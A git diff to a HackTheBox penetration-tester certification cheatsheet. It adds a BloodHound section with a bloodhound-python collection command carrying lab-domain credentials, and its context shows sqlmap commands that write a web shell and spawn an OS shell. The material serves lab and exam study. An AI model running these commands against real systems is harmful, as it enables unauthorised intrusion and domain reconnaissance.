@@ -50,6 +50,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Login Brute Forcing](#login-brute-forcing)
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
+- [bloodhound](#bloodhound)
 - [Useful Resources](#useful-resources)
 
 
@@ -752,8 +753,23 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+
 ```
-## Useful Resources
+## bloodhound 
+
+```
+# run bloodhound
+bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69
+
+# run neo4j
+sudo neo4j console
+
+# run bloodhound
+bloodhound
+
+```
+## Useful Resources 
 
 [HackTriks](https://book.hacktricks.xyz/)
 
